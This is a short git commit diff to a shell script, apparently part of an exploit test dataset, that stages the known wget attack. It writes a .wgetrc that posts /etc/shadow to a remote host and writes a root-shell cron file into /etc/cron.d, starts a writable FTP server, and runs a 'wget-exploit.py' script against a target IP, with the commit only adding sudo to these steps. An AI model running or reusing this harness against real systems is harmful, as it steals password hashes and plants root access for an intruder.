aa81018b58bb4895a3a94dc0a18c41d20120487a
Michael Hahn <mike.han@hotmail.com>
2017-03-06 16:47:09 -0500

    fix server side script bug

--- myapps/dataset2/wgettest_server.sh
+++ myapps/dataset2/wgettest_server.sh
@@ -5,14 +5,12 @@
 
 #usage: ./wgettest_server.sh <IP_address>
 
-su
-
-cat <<_EOF_>.wgetrc
+sudo cat <<_EOF_>.wgetrc
 post_file = /etc/shadow
 output_document = /etc/cron.d/wget-root-shell
 _EOF_
 
 sudo pip install pyftpdlib
-python -m pyftpdlib -p21 -w &
+sudo python -m pyftpdlib -p21 -w &
 
-python ./wget-exploit.py $1
+sudo python ./wget-exploit.py $1
